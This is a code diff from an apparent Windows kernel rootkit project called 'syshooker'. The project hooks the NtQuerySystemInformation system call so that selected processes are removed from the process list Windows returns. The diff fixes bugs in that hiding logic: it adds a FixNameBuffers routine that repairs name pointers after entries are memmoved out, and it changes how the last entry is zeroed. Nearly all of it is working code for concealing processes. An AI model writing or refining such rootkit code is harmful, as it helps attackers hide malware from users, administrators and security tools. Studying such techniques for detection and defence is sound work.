@@ -86,6 +86,19 @@ void PrintAllProcessEntries(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr) {
 	kprintf("[+] syshooker: done with printing ALL entries\n");
 }
 
+void FixNameBuffers(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, const ULONG LeftOffset) {
+	kprintf("[+] syshooker: FixNameBuffers start, offset: %d...\n", LeftOffset);
+	while (ProcessInformationPtr->NextEntryOffset != 0) { // last one will be skipped
+		wchar_t* RealProcessNameBufferAddr = (wchar_t*)((PUINT8)(ProcessInformationPtr->ImageName.Buffer) - LeftOffset); // shift value is in bytes, so we retype to PUINT8 to be able to do pointer arithmetic
+
+		// rewrite the ImageName.Buffer address
+		ProcessInformationPtr->ImageName.Buffer = RealProcessNameBufferAddr;
+
+		ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // move forward
+	}
+	kprintf("[+] syshooker: FixNameBuffers done fixing addresses.\n");
+}
+
 NTSTATUS DetourNtQuerySystemInformation(
 	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
 	_Out_ PVOID SystemInformation,
@@ -108,19 +121,11 @@ NTSTATUS DetourNtQuerySystemInformation(
 		SYSTEM_PROCESS_INFORMATION* PreviousProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
 
         if (ProcessInformationPtr) {
-			ULONG LastEntrySize;
-			if (ReturnLength) {
-				LastEntrySize = GetLastEntrySize(*ReturnLength, ProcessInformationPtr);
-			}
-			else {
-				LastEntrySize = 0;
-			}
-
 			PrintAllProcessEntries(ProcessInformationPtr);
 
             while (1) {
                 //kprintf("[+] infinityhook: NtQuerySystemInformation: PID: %d\n", ProcessInformationPtr->UniqueProcessId);
-				PrintProcessStructInfo(ProcessInformationPtr, RemovedBytesOffset);
+				PrintProcessStructInfo(ProcessInformationPtr, 0);
                 WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
                 wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER-1)); // -1 to ensure that the last char is \0
 
@@ -151,16 +156,23 @@ NTSTATUS DetourNtQuerySystemInformation(
 						// next structure address - start copying from there
 						SYSTEM_PROCESS_INFORMATION* NextProcessInformationStructAddr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);
 
+						// remember how big is this struct that we are hiding so that we can fix name buffer addresses in the following entries
+						ULONG RemovedStructSize = ProcessInformationPtr->NextEntryOffset;
+
 						kprintf("[+] syshooker: memmove: dst %p, src %p, bytescount %d\n", ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);
 						kprintf("[+] syshooker: before memmove\n");
-						PrintProcessStructInfo(NextProcessInformationStructAddr, RemovedBytesOffset);
+						PrintProcessStructInfo(NextProcessInformationStructAddr, 0);
+
 
 						// memmove memory and note that the buffer was 'shifted left' NextEntryOffset bytes
 						RemovedBytesOffset += ProcessInformationPtr->NextEntryOffset;
 						memmove(ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);
 
 						kprintf("[+] syshooker: after memmove\n");
-						PrintProcessStructInfo(ProcessInformationPtr, RemovedBytesOffset);
+						PrintProcessStructInfo(ProcessInformationPtr, 0);
+
+						// fix addresses from the current entry to the end
+						FixNameBuffers(ProcessInformationPtr, RemovedStructSize);
 
 						continue; // handle the same structure address next (because it was moved)
 					}
@@ -174,7 +186,7 @@ NTSTATUS DetourNtQuerySystemInformation(
 						// TODO - should not be FILE_DIRECTORY_INFORMATION here - fix!!!
 						// length should be PROBABLY be sizeof(SYSTEM_PROCESS_INFORMATION) + NameLength * sizeof(wchar)
 						// erease this FileInformation structure
-						memset(ProcessInformationPtr, 0, LastEntrySize);
+						memset(ProcessInformationPtr, 0, sizeof(SYSTEM_PROCESS_INFORMATION));
 						break;
 					}
 				}
